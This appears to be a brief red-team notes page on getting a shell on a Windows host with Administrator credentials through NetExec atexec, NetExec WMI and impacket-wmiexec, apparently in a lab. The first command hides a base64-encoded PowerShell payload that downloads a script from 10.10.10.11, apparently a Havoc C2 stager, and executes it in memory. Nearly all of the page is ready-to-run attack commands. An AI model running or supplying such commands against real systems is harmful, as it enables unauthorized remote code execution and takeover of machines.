# Netexec

Not really related to token stealing/creation but a good option to get shell when sliver is acting up.

    nxc smb 10.10.100.20 -d . -u Administrator -p 'password' --exec-method atexec -x 'powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAxAC8AaABhAHYAMABjAC0AcABzAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA=='

### WMI

    nxc wmi 10.10.100.20 --local-auth -u Administrator -p 'password' --rpc-timeout 10


### impacket

    impacket-wmiexec ./Administrator:'password'@10.10.100.20
